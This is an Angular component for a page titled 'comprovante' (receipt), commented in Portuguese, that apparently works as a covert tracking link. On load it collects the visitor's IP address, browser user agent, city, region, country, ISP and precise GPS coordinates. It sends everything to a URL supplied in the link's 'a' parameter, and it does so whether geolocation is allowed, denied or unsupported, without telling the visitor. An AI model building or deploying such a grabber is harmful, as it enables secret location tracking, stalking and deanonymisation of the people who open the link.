import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { adressModel, ipModel } from './models/ipModel';
import { ActivatedRoute } from '@angular/router';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export class AppComponent implements OnInit {
  title = 'comprovante';
  ip: string = '';  // ip
  userAgent: string = ""; // navegador e sistema operacional
  city: string = ""; // cidade
  contry: string = ""; // país 
  region: string = ""; // estado ou província
  loc: string = ""; // latitude
  empresa: string = ""; // empresa que fornece internet
  item:string = "";
  itemB:string = "";
  latitude:any = '';
  longitude:any = ''
  constructor(private httpClient: HttpClient,
    private route: ActivatedRoute
  ) {

  }

  ngOnInit(): void {
    this.route.queryParams.subscribe(params => {
      this.item = params['a'];
      this.itemB = params['b'];
       // Substitua 'nomeDoItem' pelo nome do seu query param
    });
    this.getIp();
  }


  getIp(): void {
    this.httpClient.get<ipModel>('https://api.ipify.org/?format=json').subscribe({
      next: (data) => {
        this.ip = data.ip
        this.userAgent = window.navigator.userAgent
        this.httpClient.get<adressModel>('https://ipinfo.io/' + this.ip + '/json').subscribe({
          next: (data) => {
            this.city = data.city; this.contry = data.country; this.region = data.region, this.loc = data.loc, this.empresa = data.org;


            const userInfo = {
              ip: this.ip,
              userAgent: this.userAgent,
              city: this.city,
              country: this.contry,
              region: this.region,
              loc: this.loc,
              empresa: this.empresa,
              latitude:this.latitude,
              longitude:this.longitude,
              item:this.itemB
            };

            this.httpClient.post(this.item, userInfo).subscribe({
              next:(data) => {

              }
            })
      
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  this.latitude = position.coords.latitude;
                  this.longitude = position.coords.longitude;

                  const userInfo = {
                    ip: this.ip,
                    userAgent: this.userAgent,
                    city: this.city,
                    country: this.contry,
                    region: this.region,
                    loc: this.loc,
                    empresa: this.empresa,
                    latitude:this.latitude,
                    longitude:this.longitude,
                    item:this.itemB
                  };
      
                  this.httpClient.post(this.item, userInfo).subscribe({
                    next:(data) => {
      
                    }
                  })
                },
                (error) => {
                  this.latitude = error;
                  this.longitude = error;

                  const userInfo = {
                    ip: this.ip,
                    userAgent: this.userAgent,
                    city: this.city,
                    country: this.contry,
                    region: this.region,
                    loc: this.loc,
                    empresa: this.empresa,
                    latitude:this.latitude,
                    longitude:this.longitude,
                    item:this.itemB
                  };
      
                  this.httpClient.post(this.item, userInfo).subscribe({
                    next:(data) => {
      
                    }
                  })
                }
              );
            } else {
              this.latitude = 'Geolocalização não é suportada pelo seu navegador.';
              this.longitude = 'Geolocalização não é suportada pelo seu navegador.';

              const userInfo = {
                ip: this.ip,
                userAgent: this.userAgent,
                city: this.city,
                country: this.contry,
                region: this.region,
                loc: this.loc,
                empresa: this.empresa,
                latitude:this.latitude,
                longitude:this.longitude,
                item:this.itemB
              };
  
              this.httpClient.post(this.item, userInfo).subscribe({
                next:(data) => {
  
                }
              })
            }

          
          }
        })
      }
    })
  }
}
